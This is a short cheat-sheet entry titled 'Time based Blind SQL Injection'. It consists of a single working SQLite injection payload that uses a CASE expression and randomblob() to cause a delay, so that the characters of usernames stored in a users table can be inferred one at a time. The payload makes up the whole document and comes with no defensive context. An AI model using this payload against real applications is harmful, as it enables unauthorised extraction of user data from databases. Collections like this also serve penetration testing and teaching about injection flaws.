## Time based Blind SQL Injection

```sql
' OR (SELECT CASE WHEN (substr((SELECT username FROM users LIMIT 1),1,1)='a') THEN randomblob(1000000000) ELSE 1 END)-- 
```